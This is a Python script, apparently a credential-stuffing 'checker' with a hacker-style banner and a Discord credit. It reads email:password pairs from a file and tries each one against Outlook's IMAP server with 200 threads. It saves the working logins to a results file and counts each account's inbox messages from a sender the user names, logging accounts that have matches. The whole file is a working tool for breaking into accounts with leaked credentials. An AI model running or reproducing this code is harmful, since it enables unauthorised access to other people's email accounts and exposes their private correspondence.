import imaplib
import email
import os
import time
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init
import shutil

init(autoreset=True)

# Configuration
input_file = "accounts.txt"
max_retries = 0
timeout_duration = 5 

valid_count = 0
found_count = 0
locked_count = 0
total_accounts = 0
found_accounts = [] 

timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
results_dir = f"results/{timestamp}"
os.makedirs(results_dir, exist_ok=True)

valid_file = os.path.join(results_dir, "valids.txt")

logo = Fore.GREEN + '''
 █    ██   ██░ ██   ███▄ ▄███▓ ▄████▄ 
 ██  ▓██▒▒▓██░ ██  ▓██▒▀█▀ ██▒▒██▀ ▀█ 
▓██  ▒██░░▒██▀▀██  ▓██    ▓██░▒▓█    ▄
▓▓█  ░██░ ░▓█ ░██  ▒██    ▒██ ▒▓▓▄ ▄██
▒▒█████▓  ░▓█▒░██▓▒▒██▒   ░██▒▒ ▓███▀ 
 ▒▓▒ ▒ ▒   ▒ ░░▒░▒░░ ▒░   ░  ░░ ░▒ ▒  
 ░▒░ ░ ░   ▒ ░▒░ ░░░  ░      ░  ░  ▒  
  ░░ ░ ░   ░  ░░ ░ ░      ░   ░       
   ░       ░  ░  ░░       ░   ░ ░
'''

footer = Fore.GREEN + "Made by zunknownn | Join https://discord.gg/TrkhTSyrBf"

def center_text(text):
    terminal_width = shutil.get_terminal_size().columns
    lines = text.strip().split('\n')
    return '\n'.join(line.center(terminal_width) for line in lines)

def check_account(email_user, email_pass, sender, sender_file, retry=0):
    global valid_count, found_count, locked_count, found_accounts
    try:
        mail = imaplib.IMAP4_SSL('outlook.office365.com', 993)
        
        mail.login(email_user, email_pass)

        mail.select("inbox")

        result, data = mail.search(None, f'(FROM "{sender}")')
        if result != 'OK':
            raise Exception(f"Failed to search for emails from {sender}")

        mail_ids = data[0].split()
        number_of_emails = len(mail_ids)

        with open(valid_file, 'a') as f:
            f.write(f"{email_user}:{email_pass}\n")
        valid_count += 1

        if number_of_emails > 0:
            sender_file_path = os.path.join(results_dir, f"{sender}.txt")
            with open(sender_file_path, 'a') as f:
                f.write(f"{email_user}:{email_pass} > {number_of_emails}\n")
            found_count += 1
            found_accounts.append(f"{email_user}:{email_pass} > {number_of_emails}") 
        else:
            locked_count += 1

    except Exception as e:
        locked_count += 1
    finally:
        try:
            mail.logout()
        except Exception as e:
            pass 

def display_stats(total_accounts, checked_count):
    percent_checked = (checked_count / total_accounts) * 100 if total_accounts > 0 else 0
    checked_remaining = f"{checked_count}/{total_accounts - checked_count}"
    
    stats_text = (
        f"Valid: {valid_count}\n"
        f"Found: {found_count}\n"
        f"Invalid: {locked_count}\n"
        f"Percentage Checked: {percent_checked:.2f}%\n"
        f"Checked / Remaining: {checked_remaining}\n"
    )

    found_text = "\n".join(f"\033[94m> {acc}\033[0m" for acc in found_accounts)  # \033[94m is blue

    sys.stdout.write("\033[H\033[J")
    
    print(center_text(logo))
    print(stats_text)  
    if found_text:
        print(found_text)
    print(footer) 

def main():
    global total_accounts

    sys.stdout.write("\033[H\033[J")  
    print(center_text(logo))
    print(footer)

    sender = input(center_text("Enter the sender's email: ")).strip()

    with open(input_file, 'r') as f:
        accounts = [line.strip().split(':') for line in f]
    
    total_accounts = len(accounts)
    checked_count = 0

    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = []
        for email_user, email_pass in accounts:
            futures.append(executor.submit(check_account, email_user, email_pass, sender, sender_file=f"{sender}.txt"))
        
        for future in as_completed(futures):
            checked_count += 1
            display_stats(total_accounts, checked_count)  

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProcess interrupted by user.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
